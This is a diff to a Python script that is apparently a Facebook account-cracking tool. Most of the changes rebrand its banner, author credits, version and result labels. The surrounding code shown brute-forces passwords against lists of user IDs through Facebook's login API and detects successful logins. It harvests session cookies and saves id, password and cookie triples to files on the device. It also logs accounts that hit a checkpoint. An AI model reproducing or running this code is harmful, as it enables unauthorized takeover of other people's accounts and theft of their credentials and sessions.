@@ -175,18 +175,18 @@ R   R  E       Y Y   A   A  L
 RRRR   EEEE     Y    AAAAA  L
 R  R   E        Y    A   A  L
 R   R  EEEEE    Y    A   A  LLLLL
-~{BLUE}X {RED}PATHANI {WHITE}
+~{BLUE}X {RED}XD {WHITE}
 
 \t[×] Developed By BLOX{EXTRA} (LANG)
 {WHITE}[•] AUTHOR       : Basta Si Blox
 {WHITE}[•] STYLE         : 1.0
 {WHITE}[•] WhatsApp     :   +9672947553
 [•] FaceBook     :   Clementine Shofee
-[•] Version      :   {RED}0.7
+[•] Version      :   {BLUE}1.1
 {WHITE}[•] Github      :   https://github.com/SiBloxIto/
 
 {WHITE}================================================
-   \33[37;41m\t Sudhair  x Rehan  x Yasir \33[0;m
+   \33[37;41m\t BLOX \33[0;m
 {WHITE}=================================================""")
 def linex():
     print('\033[1;37m----------------------------------------------')
@@ -246,7 +246,7 @@ def menu():
                                         plist.append(input(f' PUT PASSWORD {i+1}: '))
                                 linex()
                                 clear()
-                                print(' DO YOU WENT SHOW COOKIES :? (Y/N): ')
+                                print(' DO YOU WANT SHOW COOKIES :? (Y/N): ')
                                 linex()
                                 cx=input(' CHOOSE : ')
                                 if cx in ['y','Y','yes','Yes','1']:
@@ -272,7 +272,7 @@ def menu():
                                 print('\033[1;37m')
                                 linex()
                                 print(' THE PROCESS HAS COMPLETED')
-                                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+                                print(' Total GG/CP: '+str(len(oks))+'/'+str(len(cps)))
                                 linex()
                                 input(' PRESS ENTER TO BACK ')
                                 os.system('python BLOX.py')
@@ -311,7 +311,7 @@ def pak():
                 print('\033[1;37m')
                 linex()
                 print(' THE PROCESS HAS COMPLETED')
-                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+                print(' TOTAL GG/CP: '+str(len(oks))+'/'+str(len(cps)))
                 linex()
                 input(' PRESS ENTER TO BACK ')
                 os.system('python uami.py')
@@ -367,7 +367,7 @@ def ffb(ids,names,passlist):
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print('\r\r\033[1;32m [LEGEND-BLOXI-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [PWEDE-GG] '+ids+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         #print("\r\r\033[1;33m Cookie: "+coki)
                                         open('/sdcard/REYAL-COOKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
@@ -381,7 +381,7 @@ def ffb(ids,names,passlist):
                                                 break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[1;31m [ALONE-BLOXI-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                print('\r\r\x1b[1;31m [BAWAL-CP] '+ids+' | '+pas+'\033[1;97m')
                                                 open('/sdcard/BLOXI-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
@@ -398,7 +398,7 @@ xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT
 def api(ids,names,passlist):
         try:
                 global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [REYAL ] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                sys.stdout.write('\r\r\033[1;37m [REYAL] %s|\033[1;37mGG:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                 fn = names.split(' ')[0]
                 try:
                         ln = names.split(' ')[1]
@@ -490,7 +490,7 @@ def api(ids,names,passlist):
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print('\r\r\033[1;32m [LEGEND-BLOXI-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [PWEDE-GG] '+ids+' | '+pas+'\033[1;97m')
                                         open('/sdcard/BLOXI-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
@@ -501,7 +501,7 @@ def api(ids,names,passlist):
                                                 break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[1;31m [ALONE-BLOXI-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                print('\r\r\x1b[1;31m [BAWAL-CP] '+ids+' | '+pas+'\033[1;97m')
                                                 open('/sdcard/BLOXI-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
@@ -590,7 +590,7 @@ def api1(ids,names,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print('\r\r\033[1;32m [LEGEND-BLOXI-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [PWEDE-GG] '+str(uid)+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         #print("\r\r\033[1;33m Cookie: "+coki)
                                         open('/sdcard/BLOXi-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
@@ -695,7 +695,7 @@ def rndm(ids,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print('\r\r\033[1;32m [LEGEND-BLOXI-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [PWEDE-GG] '+str(uid)+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         #print("\r\r\033[1;33m Cookie: "+coki)
                                         open('/sdcard/BLOXi-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
